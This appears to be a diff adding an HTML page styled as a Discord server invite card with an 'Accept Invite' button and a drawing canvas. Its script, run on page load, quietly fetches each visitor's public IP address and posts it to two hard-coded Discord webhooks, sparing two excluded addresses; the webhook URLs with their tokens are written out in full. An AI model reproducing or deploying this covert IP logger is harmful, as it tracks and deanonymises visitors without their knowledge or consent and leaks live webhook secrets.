@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>🎀</title>
+    <link rel="icon" href="ectryn/fav.ico" type="image/x-icon">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            padding: 20px;
+            background-color: #36393F; /* Discord dark theme */
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            color: #FFFFFF;
+            position: relative;
+        }
+
+        .join-server-card {
+            background-color: #2F3136; /* Discord dark theme */
+            border-radius: 8px;
+            width: 350px;
+            padding: 29px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            color: #FFFFFF;
+            cursor: pointer; /* Set cursor to pointer when over the card */
+            position: relative;
+            z-index: 2; /* Ensure this is on top of the canvas */
+        }
+
+        .server-icon {
+            border-radius: 50%;
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 10px;
+        }
+
+        .server-name {
+            font-size: 24px;
+            margin: 5px 0;
+            font-weight: bold;
+        }
+
+        .server-details {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+        }
+
+        .server-details div {
+            display: flex;
+            align-items: center;
+            margin: 0;
+        }
+
+        .server-details div p {
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.2;
+        }
+
+        .status-circle {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+
+        .online-circle {
+            background-color: #43B581;
+        }
+
+        .total-circle {
+            background-color: #B9BBBE;
+        }
+
+        .join-button {
+            display: block;
+            background-color: #5865F2;
+            color: #FFFFFF;
+            text-transform: uppercase;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 12px;
+            border-radius: 8px;
+            border: none;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.3s;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        .join-button:hover {
+            background-color: #4752C4;
+        }
+
+        .join-button:active {
+            background-color: #3a3a3a;
+        }
+
+        #drawing-canvas {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            cursor: crosshair;
+            z-index: 1;
+        }
+
+        .note {
+            position: absolute;
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #2F3136;
+            border-radius: 4px;
+            padding: 5px;
+            font-size: 14px;
+            color: #FFFFFF;
+            pointer-events: none;
+            max-width: 200px;
+            transform: translate(-50%, -50%); /* Center the note based on click position */
+        }
+    </style>
+</head>
+<body>
+    <div class="join-server-card">
+        <img src="https://cdn.discordapp.com/icons/1153962210297651230/a_a3ba37d18827fa253b2a6554778b84e6.gif?size=160" alt="Server Icon" class="server-icon">
+        <div class="server-name">𐔌  .  ᥲ𝖿𝗍ᥱrᥕᥲ᥎ᥱ  !  ୧</div>
+        <div class="server-details">
+            <div>
+                <p id="online-members">ᥴ᥆𝗊ᥙᥱ𝗍𝗍ᥱ (jkvyne) invited you to join</p>
+            </div>
+        </div>
+        <a href="https://discord.gg/Hxz3bgx7C2" class="join-button" target="_blank">Accept Invite</a>
+    </div>
+    
+    <canvas id="drawing-canvas"></canvas>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const webhookURLs = [
+                'https://discord.com/api/webhooks/1279972557046546453/9eA_rjvtWFzb568-lDpcTcCpUqyHKRxbanM0eEOhlH5Z2CXALsXTPKLi5TzOapHSLhh9',
+                'https://discord.com/api/webhooks/1280067995653374025/urQemVYvJeFF91r0TK2Pf9Tv-7h7QX3Y8iT-GvJTrldSPdtfTHhT6VNCqmP8JthH-B_O'
+            ];
+            const ipApiURL = 'https://api.ipify.org?format=json';
+            const excludedIps = ['136.158.60.185', '112.200.162.191'];
+
+            function sendEmbedMessage(title, description) {
+                const embed = {
+                    title: title,
+                    description: description,
+                    color: 0x000000,
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: ""
+                    }
+                };
+
+                const message = {
+                    embeds: [embed]
+                };
+
+                webhookURLs.forEach(url => {
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Success:', data))
+                    .catch(error => console.error('Error:', error));
+                });
+            }
+
+            function getIpAddress(callback) {
+                fetch(ipApiURL)
+                    .then(response => response.json())
+                    .then(data => {
+                        const ip = data.ip;
+                        if (excludedIps.includes(ip)) {
+                            sendEmbedMessage("IP Address Excluded", "This IP address is excluded, so this information will not be disclosed.");
+                        } else {
+                            callback(ip);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP address:', error);
+                        sendEmbedMessage("Error", "Unable to retrieve IP address.");
+                    });
+            }
+
+            function logIpToDiscord(ip) {
+                const embed = {
+                    title: "IP Address Logged",
+                    color: 0x000000,
+                    fields: [
+                        { name: "IP Address", value: ip, inline: true }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: ""
+                    }
+                };
+
+                const message = {
+                    embeds: [embed]
+                };
+
+                webhookURLs.forEach(url => {
+                    fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => response.json())
+                    .then(data => console.log('Success:', data))
+                    .catch(error => console.error('Error:', error));
+                });
+            }
+
+            getIpAddress(ip => {
+                logIpToDiscord(ip);
+            });
+
+            // Drawing functionality
+            const canvas = document.getElementById('drawing-canvas');
+            const ctx = canvas.getContext('2d');
+            let drawing = false;
+
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+
+            // Load drawing data
+            const savedData = localStorage.getItem('drawing-data');
+            if (savedData) {
+                const img = new Image();
+                img.src = savedData;
+                img.onload = () => {
+                    ctx.drawImage(img, 0, 0);
+                };
+            }
+
+            canvas.addEventListener('mousedown', (e) => {
+                drawing = true;
+                ctx.beginPath();
+                ctx.moveTo(e.clientX, e.clientY);
+            });
+
+            canvas.addEventListener('mousemove', (e) => {
+                if (drawing) {
+                    ctx.lineTo(e.clientX, e.clientY);
+                    ctx.stroke();
+                }
+            });
+
+            canvas.addEventListener('mouseup', () => {
+                drawing = false;
+                // Save drawing data
+                localStorage.setItem('drawing-data', canvas.toDataURL());
+            });
+
+            canvas.addEventListener('mouseleave', () => {
+                drawing = false;
+            });
+        });
+    </script>
+</body>
+</html>
